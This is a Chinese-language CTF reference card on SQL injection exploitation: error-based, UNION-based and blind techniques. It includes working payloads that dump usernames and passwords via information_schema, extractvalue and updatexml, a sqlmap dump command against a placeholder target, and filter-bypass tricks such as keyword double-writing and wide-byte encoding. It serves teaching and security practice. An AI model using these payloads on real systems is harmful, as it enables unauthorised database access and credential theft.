---
source_url: knowledge/reference/web/sql-injection.md
source_title: SQL 注入利用模式（报错/盲注/联合）— reviewed solution pattern
source_version: "1.0"
publisher: CTF-Agent reviewed corpus
license: CC-BY-4.0
retrieved_at: 2026-08-31
topic: web
cwe_id: CWE-89
---

# SQL 注入利用模式（报错 / 盲注 / 联合注入）

> 本文为通用技术模式卡片，不含任何具体题目的 flag、附件路径、端点地址或原始 payload。

## 核心概念

用户输入未经参数化直接拼接进 SQL 语句，导致攻击者可以改写查询语义。按利用方式分三类：

- **报错注入**：让数据库把查询结果带进报错信息回显。
- **联合注入**（UNION-based）：把结果并到原查询的输出列中直接读出。
- **盲注**：无回显时逐字符推断（布尔盲注 / 时间盲注）。

注入发生的位置决定利用方式：WHERE 子句最常用；ORDER BY 后只能放表达式或数字；UPDATE/INSERT 可用子查询回带数据；堆叠查询（`;`）仅在部分数据库（MSSQL、PostgreSQL）可用。

## 关键细节

**识别与闭合**：输入单引号 `'` 观察是否报错或行为变化；再用 `' OR 1=1 -- ` 验证布尔语义改变。闭合方式由 SQL 原文决定：`'...'`、`"..."`、`'...')` 等，先试单引号，再试带括号变体。

**联合注入四步**（以 MySQL 为例）：

1. 求列数：`' ORDER BY 9 -- -`，逐次增大 n，直到报错；最后成功的 n 即列数。
2. 找回显位：`' UNION SELECT 1,2,3,...,n -- -`，观察哪些位置的数字出现在页面。
3. 枚举库表列：利用 `information_schema`：
   ```sql
   ' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -
   ' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' -- -
   ' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users -- -
   ```
   输出过长时改用 `limit` 分页或 `substring()` 截断。
4. 注释掉尾部：MySQL 用 `-- `（必须有空格）或 `#`（URL 中编码为 `%23`）。

**报错注入**（MySQL 5.7 常用）：
```sql
' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1))) -- -
' AND updatexml(1, concat(0x7e, (SELECT version())), 1) -- -
```
报错会返回 concat 结果（超过 32 字符会截断，需用 `substring` 分段）。

**盲注**：
- 布尔：`' AND ascii(substr((SELECT password FROM users LIMIT 1),1,1))>64 -- -`，二分法逐位逼近。
- 时间（MySQL）：`' AND if((SELECT ...)='a', sleep(3), 0) -- -`；MSSQL 用 `WAITFOR DELAY '0:0:3'`。
- 自动化：`sqlmap -u "http://target.example/search?q=1" --dbs --batch --level 3`，再 `--tables -D <库>`、`--dump -T <表>`；`--threads 10 --time-sec 2` 加速时间盲注。

**常见绕过**：空格被过滤 → `/**/`、`%0a`、`%09`、括号包裹；关键字被过滤 → 大小写混合、双写（`seleselectct`）、等价函数（`concat`↔`||`，需 `PIPES_AS_CONCAT`）；引号被过滤 → 用 `0x...` 十六进制串代替字符串字面量。

## 常见坑

- `--` 后必须跟空格（或使用 `-- -`），否则注释不生效。
- 参数被 `addslashes`/`mysqli_real_escape_string` 处理后单引号闭合无效——先确认是编码绕过（宽字节 `%bf%27`）还是根本没过滤。
- 输出位置可能做了 HTML 编码，先确认原样回显。
- 数据库方言差异：PostgreSQL 用 `||` 拼接、无 `information_schema.columns` 的旧版本（SQLite 用 `sqlite_master`）。
- `ORDER BY` 场景不能直接用 UNION 位置猜测列数，优先用报错或表达式。

## 验证方式

1. 构造闭合 + `ORDER BY` 确认列数，再验证回显位编号。
2. 每种注入类型先在本地同版本数据库复现语法正确性。
3. 盲注脚本先跑 1 个字符验证二分逻辑，再全量跑，注意网络超时阈值。
4. 拿到的每一条数据都记录来源查询，避免混淆多个注入点。
